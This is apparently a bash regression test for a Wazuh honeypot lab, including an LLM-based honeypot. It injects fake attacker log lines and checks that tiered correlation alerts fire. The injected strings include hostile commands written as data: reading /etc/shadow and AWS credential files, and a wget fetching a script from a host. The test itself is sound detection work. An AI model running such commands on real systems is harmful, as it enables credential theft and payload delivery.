#!/bin/bash
# ==============================================================================
# Correlation regression test: the tier rules, which test_rules.sh cannot reach.
#
# wazuh-logtest evaluates ONE line at a time, so frequency/timeframe rules
# (100400 OPPORTUNIST, 100401 SKILLED) never fire there. Those are the fiddliest
# rules in the lab and were the ones that misfired in practice, so they get a
# real test: inject log lines into the honeypots' own log files, let the agents
# ship them, and assert on the alerts the manager actually produced.
#
# Injecting into the log file (rather than running the attack) keeps this fast
# and hermetic - no LLM, no brute force, ~30s per case.
#
# Cases:
#   1. static honeypot: 3 recon commands from one IP     -> 100400
#   2. static honeypot: 2 beyond-recon commands          -> 100401
#   3. LLM honeypot:    3 recon + 2 deep, one session    -> 100400 + 100401
#      (proves the unified vocabulary: shelLM's feed drives the SAME tier rules)
#   4. mixed:  recon on the static box + deep in the LLM shell, same IP -> 100401
#
#   ./bin/test_correlation.sh
# ==============================================================================
set -uo pipefail
cd "$(dirname "$0")/.."

MANAGER="${WAZUH_MANAGER_CONTAINER:-wazuh.manager}"
HONEYPOT="${HONEYPOT_CONTAINER:-linux-honeypot}"
SHELLM="${SHELLM_CONTAINER:-shellm}"
SETTLE="${CORRELATION_SETTLE:-25}"     # seconds to let the agents ship + correlate
pass=0
fail=0

for c in "$MANAGER" "$HONEYPOT" "$SHELLM"; do
    docker inspect -f '{{.State.Running}}' "$c" 2>/dev/null | grep -q true || {
        echo "[!] container $c is not running. Start the lab first."; exit 1; }
done

# Each case uses its own source IP so re-runs never correlate with each other.
snoopy_line() {  # <srcip> <command>
    printf 'snoopy: user=root uid=0 tty=/dev/pts/0 cwd=/root cli=%s 59647 22 cmd=%s\n' "$1" "$2"
}
shellm_line() {  # <srcip> <command>
    printf '{"honeypot":"shelLM","event":"command","protocol":"SSH","srcip":"%s","user":"root","tier":"NONE","persona":"Eman_v1","command":"%s","time":"%s"}\n' \
        "$1" "$2" "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
}

# NOTE: -i is load-bearing. Without it docker exec never attaches stdin, the
# in-container `cat` reads nothing, and every case fails with no log line written.
#
# The 3s spacing is also deliberate. Wazuh's frequency counter does not credit two
# events that land in the SAME second: injecting `cat /etc/shadow` and `wget ...`
# a second apart produced both category alerts and NO tier, while the same pair
# spaced out fires 100401 every time. Real attacks spread over seconds, so this is
# a test artifact rather than a detection gap - but it is worth knowing before
# concluding a tier rule is broken.
inject_snoopy() {  # <srcip> <command>...
    local ip="$1"; shift
    for cmd in "$@"; do
        docker exec -i "$HONEYPOT" sh -c "cat >> /var/log/snoopy.log" <<<"$(snoopy_line "$ip" "$cmd")"
        sleep 3
    done
}
inject_shellm() {  # <srcip> <command>...
    local ip="$1"; shift
    for cmd in "$@"; do
        docker exec -i "$SHELLM" sh -c "cat >> /var/log/shellm.json" <<<"$(shellm_line "$ip" "$cmd")"
        sleep 3
    done
}

# fired <rule-id> <srcip> <since-epoch> -> 0 if that rule fired for that IP after <since>
fired() {
    docker exec "$MANAGER" python3 -c '
import json, sys, datetime
rule, ip, since = sys.argv[1], sys.argv[2], float(sys.argv[3])
for line in open("/var/ossec/logs/alerts/alerts.json"):
    try:
        a = json.loads(line)
    except ValueError:
        continue
    if a.get("rule", {}).get("id") != rule:
        continue
    if a.get("data", {}).get("srcip") != ip:
        continue
    ts = a.get("timestamp", "")[:19]
    try:
        when = datetime.datetime.strptime(ts, "%Y-%m-%dT%H:%M:%S").timestamp()
    except ValueError:
        continue
    # alerts.json timestamps are local time on the manager, same clock as date +%s
    if when >= since - 5:
        sys.exit(0)
sys.exit(1)' "$1" "$2" "$3"
}

check_case() {  # <description> <srcip> <since> <expected-rule>...
    local desc="$1" ip="$2" since="$3"; shift 3
    local ok=1 missing=""
    for rule in "$@"; do
        if ! fired "$rule" "$ip" "$since"; then ok=0; missing="$missing $rule"; fi
    done
    if [ "$ok" -eq 1 ]; then
        printf '  ok    %-54s -> %s\n' "$desc" "$*"
        pass=$((pass + 1))
    else
        printf '  FAIL  %-54s -> missing:%s\n' "$desc" "$missing"
        fail=$((fail + 1))
    fi
}

echo "== tier correlation (each case waits ${SETTLE}s for the pipeline) =="

t0=$(date +%s)
inject_snoopy 10.99.0.1 "whoami" "uname -a" "hostname"
sleep "$SETTLE"
check_case "static honeypot: 3x recon -> OPPORTUNIST" 10.99.0.1 "$t0" 100400

t0=$(date +%s)
inject_snoopy 10.99.0.2 "cat /etc/shadow" "wget http://10.0.0.9/x.sh"
sleep "$SETTLE"
check_case "static honeypot: 2x beyond-recon -> SKILLED" 10.99.0.2 "$t0" 100401

t0=$(date +%s)
inject_shellm 10.99.0.3 "whoami" "uname -a" "hostname" "cat /home/j/.aws/credentials" "wget http://10.0.0.9/x.sh"
sleep "$SETTLE"
check_case "LLM honeypot alone -> OPPORTUNIST + SKILLED" 10.99.0.3 "$t0" 100400 100401

t0=$(date +%s)
inject_snoopy 10.99.0.4 "whoami" "uname -a"
inject_shellm 10.99.0.4 "cat /home/j/.aws/credentials" "wget http://10.0.0.9/x.sh"
sleep "$SETTLE"
check_case "evidence from BOTH honeypots, one IP -> SKILLED" 10.99.0.4 "$t0" 100401

echo ""
echo "passed: $pass   failed: $fail"
[ "$fail" -eq 0 ] || exit 1
